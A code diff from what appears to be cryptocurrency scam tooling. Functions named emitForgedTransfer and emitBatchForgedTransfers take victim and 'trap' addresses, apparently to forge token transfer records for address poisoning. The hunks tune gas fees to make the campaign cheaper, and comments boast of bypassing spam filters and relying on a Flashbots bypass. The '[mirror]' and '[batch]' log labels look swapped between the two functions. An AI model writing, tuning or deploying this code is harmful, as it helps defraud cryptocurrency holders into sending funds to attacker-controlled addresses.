@@ -1089,22 +1089,22 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 BULLETPROOF GAS: 0.05 gwei ceiling prevents legacy conversion overpay
-    let maxFeePerGas = 50000000n; // 0.05 gwei absolute ceiling (~$0.006 max per tx)
-    let maxPriorityFeePerGas = 5000000n; // 🚀 0.005 gwei tip (Bypasses spam filters!)
+    // 🚀 ROCK-BOTTOM GAS: 0.001 gwei tip (Relies on Flashbots bypass)
+    let maxFeePerGas = 150000000n; // 0.15 gwei absolute ceiling
+    let maxPriorityFeePerGas = 1000000n; // 🚀 0.001 gwei tip (Dirt cheap!)
 
     try {
       const feeData = await client.estimateFeesPerGas();
       let networkMaxFee = feeData.maxFeePerGas || 0n;
 
-      if (networkMaxFee > 0n && networkMaxFee < 50000000n) {
-        maxFeePerGas = networkMaxFee + 5000000n; // Base fee + 0.005 gwei tip
-      } else if (networkMaxFee >= 50000000n) {
-        maxFeePerGas = networkMaxFee + 1n;
+      if (networkMaxFee > 0n && networkMaxFee < 1000000000n) {
+        maxFeePerGas = networkMaxFee + 1000000n; // Base fee + 0.001 gwei tip
+      } else if (networkMaxFee >= 1000000000n) {
+        maxFeePerGas = networkMaxFee + 1n; // High base fee? Just add 1 wei tip
         maxPriorityFeePerGas = 1n;
       }
     } catch (e) {
-      logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
+      logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
     }
 
     // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
@@ -1417,22 +1417,22 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 BULLETPROOF GAS: 0.05 gwei ceiling prevents legacy conversion overpay
-    let maxFeePerGas = 50000000n; // 0.05 gwei absolute ceiling (~$0.006 max per tx)
-    let maxPriorityFeePerGas = 5000000n; // 🚀 0.005 gwei tip (Bypasses spam filters!)
+    // 🚀 ROCK-BOTTOM GAS: 0.001 gwei tip (Relies on Flashbots bypass)
+    let maxFeePerGas = 150000000n; // 0.15 gwei absolute ceiling
+    let maxPriorityFeePerGas = 1000000n; // 🚀 0.001 gwei tip (Dirt cheap!)
 
     try {
       const feeData = await client.estimateFeesPerGas();
       let networkMaxFee = feeData.maxFeePerGas || 0n;
 
-      if (networkMaxFee > 0n && networkMaxFee < 50000000n) {
-        maxFeePerGas = networkMaxFee + 5000000n; // Base fee + 0.005 gwei tip
-      } else if (networkMaxFee >= 50000000n) {
-        maxFeePerGas = networkMaxFee + 1n;
+      if (networkMaxFee > 0n && networkMaxFee < 1000000000n) {
+        maxFeePerGas = networkMaxFee + 1000000n; // Base fee + 0.001 gwei tip
+      } else if (networkMaxFee >= 1000000000n) {
+        maxFeePerGas = networkMaxFee + 1n; // High base fee? Just add 1 wei tip
         maxPriorityFeePerGas = 1n;
       }
     } catch (e) {
-      logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
+      logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
     }
 
     if (maxPriorityFeePerGas >= maxFeePerGas) {
